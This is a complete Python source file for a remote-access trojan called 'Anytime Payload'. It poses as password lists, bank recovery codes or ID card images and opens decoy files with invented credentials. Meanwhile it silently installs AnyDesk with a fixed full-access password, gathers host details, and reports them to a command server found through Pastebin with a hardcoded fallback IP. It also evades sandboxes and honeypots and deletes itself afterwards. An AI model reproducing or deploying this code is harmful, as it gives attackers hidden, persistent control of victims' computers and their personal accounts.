#!/usr/bin/env python3
"""
Anytime Payload - AnyDesk Hijacker
Hijacks existing AnyDesk installation for persistent remote access
"""

import subprocess
import sys
import os
import time
import socket
import platform
import json
import threading
from pathlib import Path
from datetime import datetime, timezone

FAKE_PASSWORDS = """bgardner57@yahoo.com
Samantha04!

work email robert.gardner@mavengroup.net
mustFTW!2025

BANK OF AMERICA ONLINE BANKING !!!
username: bob.gardner
password: Murphy2019!
(has 2 factor auth - code is usually 123456 or 000000)

facebook bob.gardner.7314
Samantha04!

Wells Fargo online
user: BGARDNER4782
Murphy#2019
security question = Murphy

Social Security - mySocialSecurity account
bobgardner1957 / Murphy#2019

Medicare.gov login
same as SS account

CVS pharmacy
bobgardner / Samantha04!
prescription ready text alerts

AARP membership # 4382991847
login: bgardner57@yahoo.com / AARP2020

amazon - same as yahoo email

netflix bgardner57@yahoo.com / Netflix$Family
sam knows this one

Xfinity/Comcast
account# 8774 4382 9918 2847
bgardner / Murphy2019!
email: robert.gardner472@sbcglobal.net

Fidelity retirement account
user: BOBGARDNER
password: Fidelity$2018

wifi: NETGEAR73 / Murphy2019!

United MileagePlus# 8847392018
bobgardner1957 / United2020

ebay acct - bgardner47 / Samantha04!

paypal = yahoo login

microsoft acct same as work email

DTE Energy online
acct 2847-3821-9918
bobgardner / DTEaccess2021
"""

FAKE_RECOVERY_CODES = """Bank of America - 2FA Recovery Codes
Last Updated: October 28, 2024

Account: bob.gardner (Personal Checking ***4782)

Recovery Codes (use once each):
1. 472819-3847291
2. 193847-2947182
3. 584920-1928374
4. 847291-3948271
5. 293847-1928475
6. 748291-3847298
7. 193847-4829371
8. 584920-2938471
9. 847291-1928374
10. 293847-5849201

KEEP THESE SAFE!
If you lose access to your phone/2FA app, these codes
can be used to log in to your account.

Each code can only be used ONCE.
After using a code, cross it off this list.

Customer Service: 1-800-432-1000
"""

ANYDESK_PASSWORD = "secretsauce123"
CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
FALLBACK_IP = "52.21.29.104"
C2_PORT = 8443  # HTTP port for C2 API (FastAPI)
C2_API_KEY = "kestrel_c2_2024_secure_key_f8a9b2c1d4e5"  # API key for authentication


def is_dev_mode():
    """Check if running in dev mode"""
    try:
        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
        return os.path.exists(os.path.join(exe_dir, ".dev_mode"))
    except:
        return False


def log(msg):
    """Log only in dev mode"""
    if is_dev_mode():
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def check_honeypot_vm():
    """
    Check if running on honeypot VM. If so (and not in dev mode), show fake behavior and exit.
    Returns True if honeypot detected and should exit, False otherwise.
    """
    # Skip check in dev mode (allows testing on VM)
    if is_dev_mode():
        log("Dev mode: skipping honeypot VM check")
        return False

    try:
        hostname = socket.gethostname().upper()

        if hostname == "WIN-0FGNHSTJ0Q0":
            # SAFE MODE - We're on the honeypot VM in production mode
            log("Honeypot VM detected - activating safe mode")

            exe_name = Path(sys.executable).stem.lower()

            # For TEXT file variants - show fake error popup
            if "password" in exe_name or "recovery" in exe_name or "bankofamerica" in exe_name:
                import ctypes

                title = "Notepad (Update Required)"
                message = (
                    "You are using a legacy version of Notepad which is no longer compatible with Microsoft products or Windows 11.\n\n"
                    "Please update to the latest Windows 11 release and restart your computer to install the latest version of Notepad.\n\n"
                    "To update: Settings > Windows Update > Check for updates"
                )
                ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
                return True

            # For IMAGE file variants - extract and open the PNG, then exit
            elif "social" in exe_name or "ssn" in exe_name or "credit" in exe_name or "card" in exe_name:
                try:
                    # Get bundled resource path
                    if getattr(sys, "frozen", False):
                        bundle_dir = Path(sys._MEIPASS)
                    else:
                        bundle_dir = Path(__file__).parent

                    # Determine which image to show
                    if "social" in exe_name or "ssn" in exe_name:
                        source_image = bundle_dir / "assets" / "image1.png"
                        decoy_path = Path.cwd() / "socialsecuritycard.png"
                    else:  # credit card
                        source_image = bundle_dir / "assets" / "image2.png"
                        decoy_path = Path.cwd() / "Credit_Card_Photo.png"

                    # Copy and open the image
                    import shutil

                    shutil.copy(source_image, decoy_path)

                    if sys.platform == "win32":
                        os.startfile(str(decoy_path))  # Opens with default image viewer

                    return True  # Signal to exit
                except Exception:
                    # If image extraction fails, just exit silently
                    return True

            return True  # Exit for any unrecognized variant on honeypot VM

    except Exception:
        # If check fails, proceed with execution (fail open)
        pass

    return False


def create_decoy():
    """Create and open appropriate decoy file based on executable name"""
    try:
        # Get the executable name (without .exe extension)
        exe_name = Path(sys.executable).stem
        log(f"Executable name: {exe_name}")

        # Determine which variant we are
        if "password" in exe_name.lower():
            # passwords.exe → passwords.txt
            decoy_path = Path.cwd() / "passwords.txt"
            decoy_path.write_text(FAKE_PASSWORDS, encoding="utf-8")
            log(f"Created decoy: {decoy_path}")

            # Open in notepad
            if sys.platform == "win32":
                subprocess.Popen(["notepad.exe", str(decoy_path)], creationflags=subprocess.DETACHED_PROCESS)
            log("Opened decoy in notepad")

        elif "recovery" in exe_name.lower() or "bankofamerica" in exe_name.lower():
            # BankOfAmerica_Recovery_Codes.exe → BankOfAmerica_Recovery_Codes.txt
            decoy_path = Path.cwd() / "BankOfAmerica_Recovery_Codes.txt"
            decoy_path.write_text(FAKE_RECOVERY_CODES, encoding="utf-8")
            log(f"Created decoy: {decoy_path}")

            # Open in notepad
            if sys.platform == "win32":
                subprocess.Popen(["notepad.exe", str(decoy_path)], creationflags=subprocess.DETACHED_PROCESS)
            log("Opened decoy in notepad")

        elif "social" in exe_name.lower() or "ssn" in exe_name.lower():
            # socialsecuritycard.exe → Extract and open image1.png
            try:
                # Get bundled resource path
                if getattr(sys, "frozen", False):
                    # Running as PyInstaller exe - use _MEIPASS
                    bundle_dir = Path(sys._MEIPASS)
                else:
                    # Running as script
                    bundle_dir = Path(__file__).parent

                source_image = bundle_dir / "assets" / "image1.png"
                decoy_path = Path.cwd() / "socialsecuritycard.png"

                # Copy bundled image to current directory
                import shutil

                shutil.copy(source_image, decoy_path)
                log(f"Extracted decoy: {decoy_path}")

                # Open in default image viewer
                if sys.platform == "win32":
                    os.startfile(str(decoy_path))
                log("Opened decoy image")
            except Exception as e:
                log(f"Failed to extract/open image: {e}")

        elif "credit" in exe_name.lower() or "card" in exe_name.lower():
            # Credit_Card_Photos.exe → Extract and open image2.png
            try:
                # Get bundled resource path
                if getattr(sys, "frozen", False):
                    # Running as PyInstaller exe - use _MEIPASS
                    bundle_dir = Path(sys._MEIPASS)
                else:
                    # Running as script
                    bundle_dir = Path(__file__).parent

                source_image = bundle_dir / "assets" / "image2.png"
                decoy_path = Path.cwd() / "Credit_Card_Photo.png"

                # Copy bundled image to current directory
                import shutil

                shutil.copy(source_image, decoy_path)
                log(f"Extracted decoy: {decoy_path}")

                # Open in default image viewer
                if sys.platform == "win32":
                    os.startfile(str(decoy_path))
                log("Opened decoy image")
            except Exception as e:
                log(f"Failed to extract/open image: {e}")
        else:
            # Default fallback - create passwords.txt
            log(f"Unknown variant: {exe_name}, using default decoy")
            decoy_path = Path.cwd() / "passwords.txt"
            decoy_path.write_text(FAKE_PASSWORDS, encoding="utf-8")
            if sys.platform == "win32":
                subprocess.Popen(["notepad.exe", str(decoy_path)], creationflags=subprocess.DETACHED_PROCESS)
            log("Opened default decoy")

    except Exception as e:
        log(f"Decoy creation failed: {e}")


def find_anydesk():
    """Find AnyDesk.exe using tiered discovery"""
    log("Searching for AnyDesk.exe...")

    # Tier 1: Check running processes
    try:
        result = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq AnyDesk.exe", "/FO", "CSV", "/NH"],
            capture_output=True,
            text=True,
            timeout=2,
        )
        if "AnyDesk.exe" in result.stdout:
            # Get full path using wmic
            wmic_result = subprocess.run(
                ["wmic", "process", "where", "name='AnyDesk.exe'", "get", "ExecutablePath", "/format:list"],
                capture_output=True,
                text=True,
                timeout=2,
            )
            for line in wmic_result.stdout.split("\n"):
                if line.startswith("ExecutablePath="):
                    path = line.split("=", 1)[1].strip()
                    if path and os.path.exists(path):
                        log(f"Found via process: {path}")
                        return path
    except:
        pass

    # Tier 2: Check common paths
    common_paths = [
        Path(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")) / "AnyDesk" / "AnyDesk.exe",
        Path(os.environ.get("ProgramFiles", "C:\\Program Files")) / "AnyDesk" / "AnyDesk.exe",
        Path.home() / "Desktop" / "AnyDesk.exe",
        Path.home() / "Downloads" / "AnyDesk.exe",
        Path.home() / "Documents" / "AnyDesk.exe",
        Path(os.environ.get("APPDATA", "")) / "AnyDesk" / "AnyDesk.exe",
        Path(os.environ.get("LOCALAPPDATA", "")) / "AnyDesk" / "AnyDesk.exe",
        Path(os.environ.get("PUBLIC", "C:\\Users\\Public")) / "Desktop" / "AnyDesk.exe",
        Path(os.environ.get("PUBLIC", "C:\\Users\\Public")) / "Documents" / "AnyDesk.exe",
        Path("C:\\AnyDesk.exe"),
        Path("C:\\Tools\\AnyDesk.exe"),
        Path("C:\\Apps\\AnyDesk.exe"),
        Path("C:\\Programs\\AnyDesk.exe"),
    ]

    for path in common_paths:
        if path.exists():
            log(f"Found via common path: {path}")
            return str(path)

    # Tier 3: Shallow recursive search
    search_dirs = [
        (Path.home() / "Desktop", 2),
        (Path.home() / "Downloads", 2),
        (Path.home() / "Documents", 2),
    ]

    for base_dir, max_depth in search_dirs:
        if not base_dir.exists():
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                depth = len(Path(root).relative_to(base_dir).parts)
                if depth > max_depth:
                    dirs.clear()  # Don't recurse deeper
                    continue
                if "AnyDesk.exe" in files:
                    path = Path(root) / "AnyDesk.exe"
                    log(f"Found via search: {path}")
                    return str(path)
        except:
            pass

    log("AnyDesk.exe not found")
    return None


def get_c2_ip():
    """Fetch C2 IP from Pastebin with fallback"""
    try:
        import urllib.request

        with urllib.request.urlopen(CONFIG_URL, timeout=3) as response:
            ip = response.read().decode("utf-8").strip()
            if ip:
                log(f"Got C2 IP from Pastebin: {ip}")
                return ip
    except Exception as e:
        log(f"Pastebin fetch failed: {e}")

    log(f"Using fallback C2 IP: {FALLBACK_IP}")
    return FALLBACK_IP


def install_anydesk(anydesk_path):
    """Install AnyDesk silently as a service"""
    try:
        install_dir = Path(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")) / "AnyDesk"
        log(f"Installing AnyDesk to {install_dir}...")

        subprocess.run(
            [anydesk_path, "--install", str(install_dir), "--start-with-win", "--silent", "--update-disabled"],
            capture_output=True,
            timeout=10,
        )
        time.sleep(2)

        installed_exe = install_dir / "AnyDesk.exe"
        if installed_exe.exists():
            log(f"Installation successful: {installed_exe}")

            # Start the AnyDesk service immediately
            log("Starting AnyDesk service...")
            try:
                subprocess.run([str(installed_exe), "--start-service"], capture_output=True, timeout=5)
                time.sleep(2)
                log("AnyDesk service started")
            except Exception as e:
                log(f"Failed to start service: {e}")

            return str(installed_exe)
        else:
            log("Installation completed but exe not found, using original")
            return anydesk_path
    except Exception as e:
        log(f"Installation failed: {e}, using original")
        return anydesk_path


def remove_existing_password(anydesk_path, profile="_full_access"):
    """Remove any existing password from the specified profile"""
    try:
        log(f"Removing existing password from {profile} profile...")
        subprocess.run([anydesk_path, "--remove-password", profile], capture_output=True, timeout=5)
        log("Existing password removed")
    except Exception as e:
        log(f"Password removal failed (may not exist): {e}")


def set_anydesk_password(anydesk_path, password, profile="_full_access"):
    """Set unattended access password on _full_access profile (includes all permissions)"""
    try:
        log(f"Setting password for {profile} profile...")
        proc = subprocess.Popen(
            [anydesk_path, "--set-password", profile],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        proc.communicate(input=f"{password}\n".encode(), timeout=5)
        log(f"Password set for {profile} profile")
        return True
    except Exception as e:
        log(f"Password setting failed: {e}")
        return False


def get_anydesk_id(anydesk_path):
    """Get AnyDesk ID"""
    try:
        log("Getting AnyDesk ID...")
        result = subprocess.run([anydesk_path, "--get-id"], capture_output=True, text=True, timeout=5)
        anydesk_id = result.stdout.strip()

        if (
            anydesk_id
            and len(anydesk_id) >= 8
            and not any(x in anydesk_id.lower() for x in ["error", "fail", "invalid"])
        ):
            log(f"Got AnyDesk ID: {anydesk_id}")
            return anydesk_id
        else:
            log(f"Invalid AnyDesk ID: {anydesk_id}")
            return None
    except Exception as e:
        log(f"Failed to get ID: {e}")
        return None


def gather_intelligence():
    """Gather system intelligence"""
    import locale

    info = {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME", "unknown"),
        "os_version": platform.platform(),
        "timezone": datetime.now(timezone.utc).astimezone().tzname(),
        "timezone_offset": time.timezone / -3600,
        "locale": locale.getdefaultlocale()[0] or "unknown",
        "local_ip": "unavailable",
        "external_ip": "unavailable",
    }

    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        pass

    # Get external IP (with short timeout)
    try:
        import urllib.request

        with urllib.request.urlopen("https://api.ipify.org?format=text", timeout=1) as response:
            info["external_ip"] = response.read().decode("utf-8").strip()
    except:
        pass

    log(f"Intelligence gathered: {info['hostname']} ({info['local_ip']})")
    return info


def report_to_c2(anydesk_id, password, intelligence, execution_time):
    """Report to C2 server"""
    c2_ip = get_c2_ip()
    c2_url = f"http://{c2_ip}:{C2_PORT}/report"

    report = {"id": anydesk_id, "password": password, **intelligence, "execution_time": round(execution_time, 2)}

    log(f"Reporting to {c2_url}...")

    # Try up to 2 times
    for attempt in range(2):
        try:
            import urllib.request

            data = json.dumps(report).encode("utf-8")
            req = urllib.request.Request(
                c2_url,
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "X-API-Key": C2_API_KEY,
                },
            )

            with urllib.request.urlopen(req, timeout=2) as response:
                log(f"Report sent successfully (attempt {attempt + 1})")
                return True
        except Exception as e:
            log(f"Report failed (attempt {attempt + 1}): {e}")
            if attempt < 1:
                time.sleep(0.5 * (attempt + 1))

    return False


def self_destruct():
    """Delete the .exe file after a delay"""

    def delete_after_delay():
        time.sleep(3)
        try:
            exe_path = Path(sys.executable)
            if exe_path.exists() and exe_path.suffix == ".exe":
                os.remove(exe_path)
                log(f"Self-destructed: {exe_path}")
        except:
            pass

    thread = threading.Thread(target=delete_after_delay, daemon=True)
    thread.start()


def main():
    """Main payload execution"""
    start_time = time.time()

    try:
        log("=== Anytime Payload Starting ===")

        # SAFETY CHECK: Detect honeypot VM (only in production mode)
        if check_honeypot_vm():
            # Honeypot detected - exit without executing payload
            sys.exit(0)

        # Create decoy immediately
        create_decoy()

        # Sandbox evasion
        time.sleep(3)

        # Find AnyDesk
        anydesk_path = find_anydesk()
        if not anydesk_path:
            log("AnyDesk not found, exiting")
            return

        # Install AnyDesk
        anydesk_path = install_anydesk(anydesk_path)

        # Remove any existing password (safety step for re-infection)
        remove_existing_password(anydesk_path)

        # Set password on _full_access profile (includes all permissions + privacy mode)
        set_anydesk_password(anydesk_path, ANYDESK_PASSWORD)

        # Get AnyDesk ID
        anydesk_id = get_anydesk_id(anydesk_path)
        if not anydesk_id:
            log("Failed to get AnyDesk ID, exiting")
            return

        # Gather intelligence
        intelligence = gather_intelligence()

        # Calculate execution time
        execution_time = time.time() - start_time

        # Report to C2
        report_to_c2(anydesk_id, ANYDESK_PASSWORD, intelligence, execution_time)

        log(f"=== Payload completed in {execution_time:.2f}s ===")

    except Exception as e:
        log(f"Payload error: {e}")
        if is_dev_mode():
            import traceback

            traceback.print_exc()
    finally:
        # Self-destruct (only in production mode)
        if not is_dev_mode():
            self_destruct()
        else:
            log("Dev mode: skipping self-destruct")
            log("")
            input("Press Enter to exit...")


if __name__ == "__main__":
    main()
